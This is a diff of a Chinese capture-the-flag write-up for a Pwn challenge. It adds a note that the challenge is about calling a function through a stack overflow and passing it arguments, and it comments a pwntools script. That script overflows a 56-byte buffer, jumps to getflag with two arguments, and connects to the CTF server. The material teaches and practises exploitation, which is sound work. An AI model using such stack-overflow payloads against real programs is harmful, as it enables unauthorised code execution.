@@ -5,7 +5,10 @@ categories:
   - Pwn
 extMath: false
 ---
-_最新修改于  2026-11-22 21:08:39_
+_最新修改于  2026-11-24 16:33:15_
+
+本题考点：
+ - 栈溢出调用函数以及传参
 
 在main处可以看到输入部分
 ![](https://img.h1kari.cn/blog/images/5fe314d2a418f8197dd8fab9ec7131f4b2e26eadc8e2d240a27eb6aa49678812.webp)
@@ -31,10 +34,10 @@ from pwn import *
 context.arch = "i386"
 
 payload  = b"A" * 56
-payload += p32(0x080489A0)
-payload += p32(0x0804E6A0)
-payload += struct.pack('<I', 814536271)
-payload += struct.pack('<I', 425138641)
+payload += p32(0x080489A0) # getflag
+payload += p32(0x0804E6A0) # exit
+payload += struct.pack('<I', 814536271) # a1
+payload += struct.pack('<I', 425138641) # a2
 
 io = remote("fb1f985b5b12b4239709716f.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="fb1f985b5b12b4239709716f.tcp-ctf2.dasctf.com")
 
